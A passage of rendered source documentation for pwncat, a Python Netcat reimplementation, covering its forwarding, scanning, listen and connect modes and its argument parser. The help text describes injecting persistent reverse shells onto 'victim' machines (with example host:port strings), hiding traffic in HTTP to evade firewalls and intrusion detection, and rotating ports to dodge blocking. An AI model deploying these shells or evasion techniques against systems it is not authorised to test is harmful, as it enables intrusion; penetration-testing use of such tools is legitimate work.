                            class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
        code_send = compile(args.script_send, <span class="hljs-string">"&lt;script-send&gt;"</span>, <span
                            class="hljs-string">"exec"</span>)
    <span class="hljs-keyword">if</span> args.script_recv <span class="hljs-keyword">is</span> <span
                            class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
        code_recv = compile(args.script_recv, <span class="hljs-string">"&lt;script-recv&gt;"</span>, <span
                            class="hljs-string">"exec"</span>)

    <span class="hljs-comment"># Use command modulde</span>
    <span class="hljs-keyword">if</span> args.cmd:
        mod = IOCommand(ssig, DsIOCommand(enc, args.cmd, POPEN_BUFSIZE))
    <span class="hljs-comment"># Use output module</span>
    <span class="hljs-keyword">else</span>:
        mod = IOStdinStdout(ssig, DsIOStdinStdout(enc, TIMEOUT_READ_STDIN, args.send_on_eof))

    <span class="hljs-comment"># Run local port-forward</span>
    <span class="hljs-comment"># -&gt; listen locally and forward traffic to remote (connect)</span>
    <span class="hljs-keyword">if</span> mode == <span class="hljs-string">"local"</span>:
        <span class="hljs-comment"># Enure to re-connect forever during local port forward</span>
        cli_opts.reconn = <span class="hljs-number">-1</span>
        cli_opts.reconn_wait = <span class="hljs-number">0.0</span>
        srv_opts.keep_open = <span class="hljs-literal">True</span>
        lhost = args.local.split(<span class="hljs-string">":"</span>)[<span
                            class="hljs-number">0</span>]
        lport = int(args.local.split(<span class="hljs-string">":"</span>)[<span
                            class="hljs-number">1</span>])
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> lhost:
            lhost = <span class="hljs-literal">None</span>
        <span class="hljs-comment"># Create listen and client instances</span>
        net_srv = IONetwork(ssig, enc, lhost, [lport], <span class="hljs-string">"server"</span>, srv_opts, cli_opts, sock_opts)
        net_cli = IONetwork(ssig, enc, host, ports, <span class="hljs-string">"client"</span>, srv_opts, cli_opts, sock_opts)
        <span class="hljs-comment"># Create Runner</span>
        run = Runner(ssig, <span class="hljs-literal">False</span>, PSEStore(ssig, [net_srv, net_cli]))
        run.add_action(
            <span class="hljs-string">"TRANSMIT"</span>,
            DsRunnerAction(
                DsCallableProducer(net_srv.producer),  <span class="hljs-comment"># (recv) USER sends data to PC-SERVER</span>
                net_cli.consumer,  <span class="hljs-comment"># (send) Data parsed on to PC-CLIENT to send to TARGET</span>
                [net_cli.interrupt, net_srv.interrupt],
                transformers,
                <span class="hljs-literal">False</span>,
                <span class="hljs-literal">None</span>,
            ),
        )
        run.add_action(
            <span class="hljs-string">"RECEIVE"</span>,
            DsRunnerAction(
                DsCallableProducer(net_cli.producer),  <span class="hljs-comment"># (recv) Data back from TARGET to PC-CLIENT</span>
                net_srv.consumer,  <span class="hljs-comment"># (send) Data parsed on to PC-SERVER to back send to USER</span>
                [net_cli.interrupt, net_srv.interrupt],
                transformers,
                <span class="hljs-literal">False</span>,
                <span class="hljs-literal">None</span>,
            ),
        )
        run.run()

    <span class="hljs-comment"># Run remote port-forward</span>
    <span class="hljs-comment"># -&gt; connect to client, connect to target and proxy traffic in between.</span>
    <span class="hljs-keyword">if</span> mode == <span class="hljs-string">"remote"</span>:
        <span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> Make the listen address optional!</span>
        <span class="hljs-comment"># Enure to re-connect forever during remote port forward</span>
        cli_opts.reconn = <span class="hljs-number">-1</span>
        cli_opts.reconn_wait = <span class="hljs-number">0.0</span>
        lhost = args.remote.split(<span class="hljs-string">":"</span>)[<span
                            class="hljs-number">0</span>]
        lport = int(args.remote.split(<span class="hljs-string">":"</span>)[<span
                            class="hljs-number">1</span>])
        <span class="hljs-comment"># Create local and remote client</span>
        net_cli_l = IONetwork(ssig, enc, lhost, [lport], <span class="hljs-string">"client"</span>, srv_opts, cli_opts, sock_opts)
        net_cli_r = IONetwork(ssig, enc, host, ports, <span class="hljs-string">"client"</span>, srv_opts, cli_opts, sock_opts)
        <span class="hljs-comment"># Create Runner</span>
        run = Runner(ssig, <span class="hljs-literal">False</span>, PSEStore(ssig, [net_cli_l, net_cli_r]))
        run.add_action(
            <span class="hljs-string">"TRANSMIT"</span>,
            DsRunnerAction(
                DsCallableProducer(net_cli_l.producer),  <span class="hljs-comment"># (recv) USER sends data to PC-SERVER</span>
                net_cli_r.consumer,  <span class="hljs-comment"># (send) Data parsed on to PC-CLIENT to send to TARGET</span>
                [],
                transformers,
                <span class="hljs-literal">False</span>,
                <span class="hljs-literal">None</span>,
            ),
        )
        run.add_action(
            <span class="hljs-string">"RECEIVE"</span>,
            DsRunnerAction(
                DsCallableProducer(net_cli_r.producer),  <span class="hljs-comment"># (recv) Data back from TARGET to PC-CLIENT</span>
                net_cli_l.consumer,  <span class="hljs-comment"># (send) Data parsed on to PC-SERVER to back send to USER</span>
                [],
                transformers,
                <span class="hljs-literal">False</span>,
                <span class="hljs-literal">None</span>,
            ),
        )
        run.run()

    <span class="hljs-comment"># Port Scan</span>
    <span class="hljs-keyword">if</span> mode == <span class="hljs-string">"scan"</span>:
        print(<span class="hljs-string">"Scanning {} ports"</span>.format(len(ports)))
        net = IONetworkScanner(ssig, enc, host, args.banner, cli_opts, sock_opts)
        run = Runner(ssig, <span class="hljs-literal">True</span>, PSEStore(ssig, [net]))
        <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> ports:
            run.add_action(
                <span class="hljs-string">"PORT-{}"</span>.format(port),
                DsRunnerAction(
                    DsCallableProducer(net.producer, port),  <span class="hljs-comment"># Send port scans</span>
                    net.consumer,  <span class="hljs-comment"># Output results</span>
                    [net.interrupt],
                    [],
                    <span class="hljs-literal">True</span>,
                    <span class="hljs-literal">None</span>,
                ),
            )
        run.run()

    <span class="hljs-comment"># Run server</span>
    <span class="hljs-keyword">if</span> mode == <span class="hljs-string">"listen"</span>:
        net = IONetwork(
            ssig, enc, host, ports + args.rebind_robin, <span class="hljs-string">"server"</span>, srv_opts, cli_opts, sock_opts
        )
        <span class="hljs-comment"># Run blocking auto-deploy.</span>
        <span class="hljs-comment"># This will hand over to normal listening server on success or failure</span>
        <span class="hljs-keyword">if</span> args.self_inject:
            cnc_cmd, cnc_host, cnc_port = args.self_inject.split(<span
                            class="hljs-string">":"</span>)
            cnc_ports = ArgValidator.get_port_list_from_string(cnc_port)
            CNCAutoDeploy(net, cnc_cmd, cnc_host, cnc_ports)

        <span class="hljs-keyword">if</span> args.http:
            trans_recv = [TransformHttpUnpack({})] + transformers
            trans_send = [TransformHttpPack({<span class="hljs-string">"host"</span>: host, <span
                            class="hljs-string">"reply"</span>: <span
                            class="hljs-string">"response"</span>})] + transformers
        <span class="hljs-keyword">else</span>:
            trans_recv = transformers
            trans_send = transformers

        run = Runner(ssig, <span class="hljs-literal">False</span>, PSEStore(ssig, [net]))
        run.add_action(
            <span class="hljs-string">"RECV"</span>,
            DsRunnerAction(
                DsCallableProducer(net.producer),  <span class="hljs-comment"># receive data</span>
                mod.consumer,
                [net.interrupt],
                trans_recv,
                <span class="hljs-literal">False</span>,
                code_recv,
            ),
        )
        run.add_action(
            <span class="hljs-string">"STDIN"</span>,
            DsRunnerAction(
                DsCallableProducer(mod.producer),
                net.consumer,  <span class="hljs-comment"># send data</span>
                [mod.interrupt],
                trans_send,
                <span class="hljs-literal">False</span>,
                code_send,
            ),
        )
        run.run()

    <span class="hljs-comment"># Run client</span>
    <span class="hljs-keyword">if</span> mode == <span class="hljs-string">"connect"</span>:
        net = IONetwork(
            ssig, enc, host, ports + args.reconn_robin, <span class="hljs-string">"client"</span>, srv_opts, cli_opts, sock_opts
        )

        <span class="hljs-keyword">if</span> args.http:
            trans_recv = [TransformHttpUnpack({})] + transformers
            trans_send = [TransformHttpPack({<span class="hljs-string">"host"</span>: host, <span
                            class="hljs-string">"reply"</span>: <span
                            class="hljs-string">"response"</span>})] + transformers
        <span class="hljs-keyword">else</span>:
            trans_recv = transformers
            trans_send = transformers

        run = Runner(ssig, <span class="hljs-literal">False</span>, PSEStore(ssig, [net]))
        run.add_action(
            <span class="hljs-string">"RECV"</span>,
            DsRunnerAction(
                DsCallableProducer(net.producer),  <span class="hljs-comment"># receive data</span>
                mod.consumer,
                [net.interrupt],
                trans_recv,
                <span class="hljs-literal">False</span>,
                code_recv,
            ),
        )
        run.add_action(
            <span class="hljs-string">"STDIN"</span>,
            DsRunnerAction(
                DsCallableProducer(mod.producer),
                net.consumer,  <span class="hljs-comment"># send data</span>
                [mod.interrupt],
                trans_send,
                <span class="hljs-literal">False</span>,
                code_send,
            ),
        )
        <span class="hljs-keyword">if</span> type(args.ping_intvl) <span
                            class="hljs-keyword">is</span> int <span class="hljs-keyword">and</span> args.ping_intvl &gt; <span
                            class="hljs-number">0</span>:
            payload = StringEncoder.encode(args.ping_word)
            run.add_timer(
                <span class="hljs-string">"PING-INT"</span>,
                DsRunnerTimer(net.consumer, ssig, args.ping_intvl, (payload,), {}),  <span
                            class="hljs-comment"># send data</span>
            )
        <span class="hljs-keyword">if</span> args.ping_init:
            payload = StringEncoder.encode(args.ping_word)
            run.add_repeater(
                <span class="hljs-string">"PING-REP"</span>,
                DsRunnerRepeater(net.consumer, ssig, <span class="hljs-number">1</span>, <span
                            class="hljs-number">0.0</span>, (payload,), {}),  <span
                            class="hljs-comment"># send data</span>
            )
        run.run()


<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-comment"># [11/11 MAIN ENTRYPOINT]: (2/2) start</span>
<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    main()</code></pre>
            </details>
        </section>
        <section>
        </section>
        <section>
        </section>
        <section>
            <h2 class="section-title" id="header-functions">Functions</h2>
            <dl>
                <dt id="pwncat.get_args"><code class="name flex">
                    <span>def <span class="ident">get_args</span></span>(<span>)</span>
                </code></dt>
                <dd>
                    <div class="desc"><p>Retrieve command line arguments.</p></div>
                    <details class="source">
                        <summary>
                            <span>Expand source code</span>
                        </summary>
                        <pre><code class="python hljs"><span class="hljs-function"><span
                                class="hljs-keyword">def</span> <span
                                class="hljs-title">get_args</span>():</span>
    <span class="hljs-comment"># type: () -&gt; argparse.Namespace</span>
    <span class="hljs-string">"""Retrieve command line arguments."""</span>
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawTextHelpFormatter,
        add_help=<span class="hljs-literal">False</span>,
        usage=<span class="hljs-string">"""%(prog)s [options] hostname port
       %(prog)s [options] -l [hostname] port
       %(prog)s [options] -z hostname port
       %(prog)s [options] -L [addr:]port hostname port
       %(prog)s [options] -R addr:port hostname port
       %(prog)s -V, --version
       %(prog)s -h, --help
       """</span>
        % ({<span class="hljs-string">"prog"</span>: APPNAME}),
        description=<span class="hljs-string">"""
Enhanced and compatible Netcat implementation written in Python (2 and 3) with
connect, zero-i/o, listen and forward modes and techniques to detect and evade
firewalls and intrusion detection/prevention systems.

If no mode arguments are specified, pwncat will run in connect mode and act as
a client to connect to a remote endpoint. If the connection to the remote
endoint is lost, pwncat will quit. See options for how to automatically re-
connect."""</span>,
    )

    positional = parser.add_argument_group(<span class="hljs-string">"positional arguments"</span>)
    mode = parser.add_argument_group(<span class="hljs-string">"mode arguments"</span>)
    optional = parser.add_argument_group(<span class="hljs-string">"optional arguments"</span>)
    protocol = parser.add_argument_group(<span class="hljs-string">"protocol arguments"</span>)
    cnc = parser.add_argument_group(<span
                                    class="hljs-string">"command &amp; control arguments"</span>)
    pse = parser.add_argument_group(<span class="hljs-string">"pwncat scripting engine"</span>)
    zero = parser.add_argument_group(<span class="hljs-string">"zero-i/o mode arguments"</span>)
    lmode = parser.add_argument_group(<span class="hljs-string">"listen mode arguments"</span>)
    cmode = parser.add_argument_group(<span class="hljs-string">"connect mode arguments"</span>)
    misc = parser.add_argument_group(<span class="hljs-string">"misc arguments"</span>)

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Positional arguments</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    positional.add_argument(
        <span class="hljs-string">"hostname"</span>,
        nargs=<span class="hljs-string">"?"</span>,
        type=str,
        help=<span class="hljs-string">"""Address to listen, forward, scan or connect to.

"""</span>,
    )
    positional.add_argument(
        <span class="hljs-string">"port"</span>,
        type=ArgValidator.type_port_list,
        help=<span class="hljs-string">"""[All modes]
Single port to listen, forward or connect to.
[Zero-I/O mode]
Specify multiple ports to scan:
Via list:  4444,4445,4446
Via range: 4444-4446
Via incr:  4444+2
"""</span>,
    )

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Mode arguments</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    mode.add_argument(
        <span class="hljs-string">"-l"</span>,
        <span class="hljs-string">"--listen"</span>,
        action=<span class="hljs-string">"store_true"</span>,
        default=<span class="hljs-literal">False</span>,
        help=<span class="hljs-string">"""[Listen mode]:
Start a server and listen for incoming connections.
If using TCP and a connected client disconnects or the
connection is interrupted otherwise, the server will
quit. See -k/--keep-open to change this behaviour.

"""</span>,
    )
    mode.add_argument(
        <span class="hljs-string">"-z"</span>,
        <span class="hljs-string">"--zero"</span>,
        action=<span class="hljs-string">"store_true"</span>,
        default=<span class="hljs-literal">False</span>,
        help=<span class="hljs-string">"""[Zero-I/0 mode]:
Connect to a remote endpoint and report status only.
Used for port scanning.
See --banner for version detection.

"""</span>,
    )
    mode.add_argument(
        <span class="hljs-string">"-L"</span>,
        <span class="hljs-string">"--local"</span>,
        metavar=<span class="hljs-string">"[addr:]port"</span>,
        type=ArgValidator.type_local,
        default=<span class="hljs-literal">False</span>,
        help=<span class="hljs-string">"""[Local forward mode]:
This mode will start a server and a client internally.
The internal server will listen locally on specified
addr/port (given by --local [addr:]port).
The server will then forward traffic to the internal
client which connects to another server specified by
hostname/port given via positional arguments.
(I.e.: proxies a remote service to a local address)

"""</span>,
    )
    mode.add_argument(
        <span class="hljs-string">"-R"</span>,
        <span class="hljs-string">"--remote"</span>,
        metavar=<span class="hljs-string">"addr:port"</span>,
        type=ArgValidator.type_remote,
        default=<span class="hljs-literal">False</span>,
        help=<span class="hljs-string">"""[Remote forward mode]:
This mode will start two clients internally. One is
connecting to the target and one is connecting to
another pwncat/netcat server you have started some-
where. Once connected, it will then proxy traffic
between you and the target.
This mode should be applied on machines that block
incoming traffic and only allow outbound.
The connection to your listening server is given by
-R/--remote addr:port and the connection to the
target machine via the positional arguments.
"""</span>,
    )

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Optional arguments</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    optional.add_argument(
        <span class="hljs-string">"-e"</span>,
        <span class="hljs-string">"--exec"</span>,
        metavar=<span class="hljs-string">"cmd"</span>,
        type=str,
        default=<span class="hljs-literal">False</span>,
        dest=<span class="hljs-string">"cmd"</span>,
        help=<span class="hljs-string">"""Execute shell command. Only for connect or listen mode.

"""</span>,
    )
    <span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> add --crlf-i and --crlf-o to only do this on input or output and have</span>
    <span class="hljs-comment"># --crlf to always do it on input and output!</span>
    optional.add_argument(
        <span class="hljs-string">"-C"</span>,
        <span class="hljs-string">"--crlf"</span>,
        metavar=<span class="hljs-string">"lf"</span>,
        type=ArgValidator.type_crlf,
        default=<span class="hljs-literal">None</span>,
        help=<span class="hljs-string">"""Specify, 'lf', 'crlf' or 'cr' to always force replacing
line endings for input and outout accordingly. Specify
'no' to completely remove any line feeds. By default
it will not replace anything and takes what is entered
(usually CRLF on Windows, LF on Linux and some times
CR on MacOS).

"""</span>,
    )
    optional.add_argument(
        <span class="hljs-string">"-n"</span>,
        <span class="hljs-string">"--nodns"</span>,
        action=<span class="hljs-string">"store_true"</span>,
        default=<span class="hljs-literal">False</span>,
        help=<span class="hljs-string">"""Do not resolve DNS.

"""</span>,
    )
    optional.add_argument(
        <span class="hljs-string">"--send-on-eof"</span>,
        action=<span class="hljs-string">"store_true"</span>,
        default=<span class="hljs-literal">False</span>,
        help=<span class="hljs-string">"""Buffer data received on stdin until EOF and send
everything in one chunk.

"""</span>,
    )
    optional.add_argument(
        <span class="hljs-string">"--no-shutdown"</span>,
        action=<span class="hljs-string">"store_true"</span>,
        default=<span class="hljs-literal">False</span>,
        help=<span class="hljs-string">"""Do not shutdown into half-duplex mode.
If this option is passed, pwncat won't invoke shutdown
on a socket after seeing EOF on stdin. This is provided
for backward-compatibility with OpenBSD netcat, which
exhibits this behavior.

"""</span>,
    )
    optional.add_argument(
        <span class="hljs-string">"-v"</span>,
        <span class="hljs-string">"--verbose"</span>,
        action=<span class="hljs-string">"count"</span>,
        default=<span class="hljs-number">0</span>,
        help=<span class="hljs-string">"""Be verbose and print info to stderr. Use -v, -vv, -vvv
or -vvvv for more verbosity. The server performance will
decrease drastically if you use more than three times.

"""</span>,
    )
    optional.add_argument(
        <span class="hljs-string">"--info"</span>,
        metavar=<span class="hljs-string">"type"</span>,
        type=ArgValidator.type_info,
        default=<span class="hljs-literal">None</span>,
        help=<span class="hljs-string">"""Show additional info about sockets, IPv4/6 or TCP opts
applied to the current socket connection. Valid
parameter are 'sock', 'ipv4', 'ipv6', 'tcp' or 'all'.
Note, you must at least be in INFO verbose mode in order
to see them (-vv).

"""</span>,
    )
    optional.add_argument(
        <span class="hljs-string">"-c"</span>,
        <span class="hljs-string">"--color"</span>,
        metavar=<span class="hljs-string">"str"</span>,
        type=ArgValidator.type_color,
        default=<span class="hljs-string">"auto"</span>,
        help=<span class="hljs-string">"""Colored log output. Specify 'always', 'never' or 'auto'.
In 'auto' mode, color is displayed as long as the output
goes to a terminal. If it is piped into a file, color
will automatically be disabled. This mode also disables
color on Windows by default. (default: auto)

"""</span>,
    )
    optional.add_argument(
        <span class="hljs-string">"--safe-word"</span>,
        metavar=<span class="hljs-string">"str"</span>,
        type=str,
        default=<span class="hljs-literal">None</span>,
        help=<span class="hljs-string">"""All modes:
If %(prog)s is started with this argument, it will shut
down as soon as it receives the specified string. The
--keep-open (server) or --reconn (client) options will
be ignored and it won't listen again or reconnect to you.
Use a very unique string to not have it shut down
accidentally by other input.
"""</span>
        % ({<span class="hljs-string">"prog"</span>: APPNAME}),
    )

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Protocol arguments</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    protocol.add_argument(
        <span class="hljs-string">"-4"</span>,
        dest=<span class="hljs-string">"ipv4"</span>,
        action=<span class="hljs-string">"store_true"</span>,
        default=<span class="hljs-literal">False</span>,
        help=<span class="hljs-string">"""Only Use IPv4 (default: IPv4 and IPv6 dualstack).

"""</span>,
    )
    protocol.add_argument(
        <span class="hljs-string">"-6"</span>,
        action=<span class="hljs-string">"store_true"</span>,
        default=<span class="hljs-literal">False</span>,
        dest=<span class="hljs-string">"ipv6"</span>,
        help=<span class="hljs-string">"""Only Use IPv6 (default: IPv4 and IPv6 dualstack).

"""</span>,
    )
    protocol.add_argument(
        <span class="hljs-string">"-u"</span>,
        <span class="hljs-string">"--udp"</span>,
        action=<span class="hljs-string">"store_true"</span>,
        default=<span class="hljs-literal">False</span>,
        help=<span class="hljs-string">"""Use UDP for the connection instead of TCP.

"""</span>,
    )
    protocol.add_argument(
        <span class="hljs-string">"-T"</span>,
        <span class="hljs-string">"--tos"</span>,
        metavar=<span class="hljs-string">"str"</span>,
        type=ArgValidator.type_tos,
        default=<span class="hljs-literal">None</span>,
        help=<span class="hljs-string">"""Specifies IP Type of Service (ToS) for the connection.
Valid values are the tokens 'mincost', 'lowcost',
'reliability', 'throughput' or 'lowdelay'.

"""</span>,
    )
    protocol.add_argument(
        <span class="hljs-string">"--http"</span>,
        action=<span class="hljs-string">"store_true"</span>,
        default=<span class="hljs-literal">False</span>,
        help=<span class="hljs-string">"""Connect / Listen mode (TCP and UDP):
Hide traffic in http packets to fool Firewalls/IDS/IPS.

"""</span>,
    )
    protocol.add_argument(
        <span class="hljs-string">"--https"</span>,
        action=<span class="hljs-string">"store_true"</span>,
        default=<span class="hljs-literal">False</span>,
        help=<span class="hljs-string">"""Connect / Listen mode (TCP and UDP):
Hide traffic in https packets to fool Firewalls/IDS/IPS.

"""</span>,
    )
    protocol.add_argument(
        <span class="hljs-string">"-H"</span>,
        <span class="hljs-string">"--header"</span>,
        metavar=<span class="hljs-string">"str"</span>,
        nargs=<span class="hljs-string">"*"</span>,
        default=[],
        help=<span class="hljs-string">"""Add HTTP headers to your request when using --http(s)."""</span>,
    )

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Command &amp; Control arguments</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    cnc.add_argument(
        <span class="hljs-string">"--self-inject"</span>,
        metavar=<span class="hljs-string">"cmd:host:port[s]"</span>,
        type=ArgValidator.type_self_inject,
        default=<span class="hljs-literal">None</span>,
        help=<span class="hljs-string">"""Listen mode (TCP only):
If you are about to inject a reverse shell onto the
victim machine (via php, bash, nc, ncat or similar),
start your listening server with this argument.
This will then (as soon as the reverse shell connects)
automatically deploy and background-run an unbreakable
pwncat reverse shell onto the victim machine which then
also connects back to you with specified arguments.
Example: '--self-inject /bin/bash:10.0.0.1:4444'
It is also possible to launch multiple reverse shells by
specifying multiple ports.
Via list:  --self-inject /bin/sh:10.0.0.1:4444,4445,4446
Via range: --self-inject /bin/sh:10.0.0.1:4444-4446
Via incr:  --self-inject /bin/sh:10.0.0.1:4444+2
Note: this is currently an experimental feature and does
not work on Windows remote hosts yet.
"""</span>,
    )

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># PSE arguments</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    pse.add_argument(
        <span class="hljs-string">"--script-send"</span>,
        metavar=<span class="hljs-string">"file"</span>,
        type=ArgValidator.type_file_content,
        default=<span class="hljs-literal">None</span>,
        help=<span class="hljs-string">"""All modes (TCP and UDP):
A Python scripting engine to define your own custom
transformer function which will be executed before
sending data to a remote endpoint. Your file must
contain the exact following function which will:
be applied as the transformer:
def transform(data, pse):
    # NOTE: the function name must be 'transform'
    # NOTE: the function param name must be 'data'
    # NOTE: indentation must be 4 spaces
    # ... your transformations goes here
    return data
You can also define as many custom functions or classes
within this file, but ensure to prefix them uniquely to
not collide with pwncat's function or classes, as the
file will be called with exec().

"""</span>,
    )
    pse.add_argument(
        <span class="hljs-string">"--script-recv"</span>,
        metavar=<span class="hljs-string">"file"</span>,
        type=ArgValidator.type_file_content,
        default=<span class="hljs-literal">None</span>,
        help=<span class="hljs-string">"""All modes (TCP and UDP):
A Python scripting engine to define your own custom
transformer function which will be executed after
receiving data from a remote endpoint. Your file must
contain the exact following function which will:
be applied as the transformer:
def transform(data, pse):
    # NOTE: the function name must be 'transform'
    # NOTE: the function param name must be 'data'
    # NOTE: indentation must be 4 spaces
    # ... your transformations goes here
    return data
You can also define as many custom functions or classes
within this file, but ensure to prefix them uniquely to
not collide with pwncat's function or classes, as the
file will be called with exec().
"""</span>,
    )

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Zero-I/O mode arguments</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    zero.add_argument(
        <span class="hljs-string">"--banner"</span>,
        action=<span class="hljs-string">"store_true"</span>,
        default=<span class="hljs-literal">False</span>,
        help=<span class="hljs-string">"""Zero-I/O (TCP and UDP):
Try banner grabbing during port scan.
"""</span>,
    )

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Listen mode arguments</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    lmode.add_argument(
        <span class="hljs-string">"-k"</span>,
        <span class="hljs-string">"--keep-open"</span>,
        action=<span class="hljs-string">"store_true"</span>,
        default=<span class="hljs-literal">False</span>,
        help=<span class="hljs-string">"""Listen mode (TCP only):
Re-accept new clients in listen mode after a client has
disconnected or the connection is interrupted otherwise.
(default: server will quit after connection is gone)

"""</span>,
    )
    lmode.add_argument(
        <span class="hljs-string">"--rebind"</span>,
        metavar=<span class="hljs-string">"x"</span>,
        nargs=<span class="hljs-string">"?"</span>,
        type=int,
        default=<span class="hljs-number">0</span>,
        help=<span class="hljs-string">"""Listen mode (TCP and UDP):
If the server is unable to bind, it will re-initialize
itself x many times before giving up. Omit the
quantifier to rebind endlessly or specify a positive
integer for how many times to rebind before giving up.
See --rebind-robin for an interesting use-case.
(default: fail after first unsuccessful try).

"""</span>,
    )
    lmode.add_argument(
        <span class="hljs-string">"--rebind-wait"</span>,
        metavar=<span class="hljs-string">"s"</span>,
        type=float,
        default=<span class="hljs-number">1.0</span>,
        help=<span class="hljs-string">"""Listen mode (TCP and UDP):
Wait x seconds between re-initialization. (default: 1)

"""</span>,
    )
    lmode.add_argument(
        <span class="hljs-string">"--rebind-robin"</span>,
        metavar=<span class="hljs-string">"port"</span>,
        type=ArgValidator.type_port_list,
        default=[],
        help=<span class="hljs-string">"""Listen mode (TCP and UDP):
If the server is unable to initialize (e.g: cannot bind
and --rebind is specified, it it will shuffle ports in
round-robin mode to bind to.
Use comma separated string such as '80,81,82,83', a range
of ports '80-83' or an increment '80+3'.
Set --rebind to at least the number of ports to probe +1
This option requires --rebind to be specified.
"""</span>,
    )

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Connect mode arguments</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    cmode.add_argument(
        <span class="hljs-string">"--source-addr"</span>,
        metavar=<span class="hljs-string">"addr"</span>,
        type=str,
        default=<span class="hljs-literal">None</span>,
        dest=<span class="hljs-string">"source_addr"</span>,
        help=<span class="hljs-string">"""Specify source bind IP address for connect mode.

"""</span>,
    )
    cmode.add_argument(
        <span class="hljs-string">"--source-port"</span>,
        metavar=<span class="hljs-string">"port"</span>,
        type=ArgValidator.type_port,
        default=<span class="hljs-literal">None</span>,
        dest=<span class="hljs-string">"source_port"</span>,
        help=<span class="hljs-string">"""Specify source bind port for connect mode.

"""</span>,
    )
    cmode.add_argument(
        <span class="hljs-string">"--reconn"</span>,
        metavar=<span class="hljs-string">"x"</span>,
        nargs=<span class="hljs-string">"?"</span>,
        type=int,
        default=<span class="hljs-number">0</span>,
        help=<span class="hljs-string">"""Connect mode (TCP and UDP):
If the remote server is not reachable or the connection
is interrupted, the client will connect again x many
times before giving up. Omit the quantifier to retry
endlessly or specify a positive integer for how many
times to retry before giving up.
(default: quit if the remote is not available or the
connection was interrupted)
This might be handy for stable TCP reverse shells ;-)
Note on UDP:
By default UDP does not know if it is connected, so
it will stop at the first port and assume it has a
connection. Consider using --udp-sconnect with this
option to make UDP aware of a successful connection.

"""</span>,
    )
    cmode.add_argument(
        <span class="hljs-string">"--reconn-wait"</span>,
        metavar=<span class="hljs-string">"s"</span>,
        type=float,
        default=<span class="hljs-number">1.0</span>,
        help=<span class="hljs-string">"""Connect mode (TCP and UDP):
Wait x seconds between re-connects. (default: 1)

"""</span>,
    )
    cmode.add_argument(
        <span class="hljs-string">"--reconn-robin"</span>,
        metavar=<span class="hljs-string">"port"</span>,
        type=ArgValidator.type_port_list,
        default=[],
        help=<span class="hljs-string">"""Connect mode (TCP and UDP):
If the remote server is not reachable or the connection
is interrupted and --reconn is specified, the client
will shuffle ports in round-robin mode to connect to.
Use comma separated string such as '80,81,82,83', a range
of ports '80-83' or an increment '80+3'.
Set --reconn to at least the number of ports to probe +1
This helps reverse shell to evade intrusiona prevention
systems that will cut your connection and block the
outbound port.
This is also useful in Connect or Zero-I/O mode to
figure out what outbound ports are allowed.

"""</span>,
    )
    cmode.add_argument(
        <span class="hljs-string">"--ping-init"</span>,
        action=<span class="hljs-string">"store_true"</span>,
        default=<span class="hljs-literal">False</span>,
        help=<span class="hljs-string">"""Connect mode (TCP and UDP):
UDP is a stateless protocol unlike TCP, so no hand-
shake communication takes place and the client just
sends data to a server without being "accepted" by
the server first.
This means a server waiting for an UDP client to
connect to, is unable to send any data to the client,
before the client hasn't send data first. The server
simply doesn't know the IP address before an initial
connect.
The --ping-init option instructs the client to send one
single initial ping packet to the server, so that it is
able to talk to the client.
This is a way to make a UDP reverse shell work.
See --ping-word for what char/string to send as initial
ping packet (default: '\\0')

"""</span>,
    )
    cmode.add_argument(
        <span class="hljs-string">"--ping-intvl"</span>,
        metavar=<span class="hljs-string">"s"</span>,
        type=int,
        default=<span class="hljs-literal">False</span>,
        help=<span class="hljs-string">"""Connect mode (TCP and UDP):
Instruct the client to send ping intervalls every s sec.
This allows you to restart your UDP server and just wait
for the client to report back in. This might be handy
for stable UDP reverse shells ;-)
See --ping-word for what char/string to send as initial
ping packet (default: '\\0')

"""</span>,
    )
    cmode.add_argument(
        <span class="hljs-string">"--ping-word"</span>,
        metavar=<span class="hljs-string">"str"</span>,
        type=str,
        default=<span class="hljs-string">"\0"</span>,
        help=<span class="hljs-string">"""Connect mode (TCP and UDP):
Change the default character '\\0' to use for upd ping.
Single character or strings are supported.

"""</span>,
    )
    <span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> Isn't this already covered by --reconn-robin or --zero</span>
    <span class="hljs-comment"># What should be the behaviour (keep connection or hop on?)</span>
    cmode.add_argument(
        <span class="hljs-string">"--ping-robin"</span>,
        metavar=<span class="hljs-string">"port"</span>,
        type=ArgValidator.type_port_list,
        default=[],
        help=<span class="hljs-string">"""Connect mode (TCP and UDP):
Instruct the client to shuffle the specified ports in
round-robin mode for a remote server to ping.
This might be handy to scan outbound allowed ports.
Use comma separated string such as '80,81,82,83', a range
of ports '80-83' or an increment '80+3'.
Use --ping-intvl 0 to be faster.

"""</span>,
    )
    cmode.add_argument(
